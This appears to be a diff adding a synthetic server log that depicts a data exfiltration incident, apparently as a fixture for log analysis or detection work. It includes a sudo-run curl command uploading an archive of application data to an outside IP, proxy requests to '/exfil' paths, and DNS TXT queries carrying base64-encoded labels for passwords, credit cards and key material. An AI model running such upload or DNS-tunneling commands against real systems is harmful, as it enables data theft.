@@ -1,0 +1,17 @@
+Jul 28 11:00:01 proxy-server squid[8010]: 185.220.104.5 TCP_MISS/200 5120000 GET http://185.220.104.100/exfil?data= - DIRECT/185.220.104.100 text/plain
+Jul 28 11:00:02 proxy-server squid[8011]: 185.220.104.5 TCP_MISS/200 10240000 GET http://185.220.104.100/exfil2 - DIRECT/185.220.104.100 text/plain
+Jul 28 11:00:03 proxy-server squid[8012]: 185.220.104.5 TCP_MISS/200 20480000 GET http://185.220.104.100/exfil3 - DIRECT/185.220.104.100 text/plain
+Jul 28 11:01:00 proxy-server auditd[8020]: SYSCALL arch=c000003e syscall=59 success=yes exit=0 a0=55f3a1c2b880 a1=55f3a1c2b950 a2=55f3a1c2ba20 a3=0 items=2 ppid=8015 pid=8021 auid=1005 uid=1005 gid=1005 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=6 comm="scp" exe="/usr/bin/scp"
+Jul 28 11:01:30 proxy-server auditd[8025]: SYSCALL arch=c000003e syscall=44 success=yes exit=0 a0=3 a1=7ffe0b0b0b00 a2=80 a3=0 items=0 ppid=8021 pid=8026 auid=1005 uid=1005 gid=1005 euid=1005 suid=1005 fsuid=1005 egid=1005 sgid=1005 fsgid=1005 tty=pts0 ses=6 comm="scp" exe="/usr/bin/scp" key="net_send"
+Jul 28 11:02:00 proxy-server kernel: [NETFILTER] IN=eth0 OUT=eth1 SRC=10.0.1.50 DST=185.220.104.100 LEN=1450 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=443 DPT=443 SEQ=12345 ACK=98765 WINDOW=500
+Jul 28 11:02:30 proxy-server sudo[8030]:   app_user : TTY=pts/0 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/tar czf /tmp/backup.tar.gz /opt/app/data/
+Jul 28 11:02:45 proxy-server sudo[8035]:   app_user : TTY=pts/0 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/curl -F "file=@/tmp/backup.tar.gz" http://185.220.104.100/upload
+Jul 28 11:03:00 proxy-server dnsmasq[8040]: query[TXT] wordpress.com 185.220.104.5 from 10.0.1.50
+Jul 28 11:03:01 proxy-server dnsmasq[8041]: query[TXT] googledocs.com 185.220.104.5 from 10.0.1.50
+Jul 28 11:03:02 proxy-server dnsmasq[8042]: query[TXT] dropbox.com 185.220.104.5 from 10.0.1.50
+Jul 28 11:03:05 proxy-server dnsmasq[8043]: query[TXT] ZXhmaWwgZGF0YQo= 185.220.104.5 from 10.0.1.50
+Jul 28 11:03:06 proxy-server dnsmasq[8044]: query[TXT] cGFzc3dvcmRzMTIz 185.220.104.5 from 10.0.1.50
+Jul 28 11:03:07 proxy-server dnsmasq[8045]: query[TXT] Y3JlZGl0IGNhcmRz 185.220.104.5 from 10.0.1.50
+Jul 28 11:03:10 proxy-server dnsmasq[8046]: query[TXT] U1NMIGtleSBtYXRlcmlhbA== 185.220.104.5 from 10.0.1.50
+Jul 28 11:04:00 proxy-server fail2ban[8050]: [dns] DNS tunneling detected for IP 10.0.1.50 - query rate 45/sec to non-existent domains
+Jul 28 11:04:30 proxy-server auditd[8055]: ANOM_ABEND auid=1005 uid=1005 gid=1005 ses=6 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 pid=8021 comm="scp" reason="net_send" sig=0
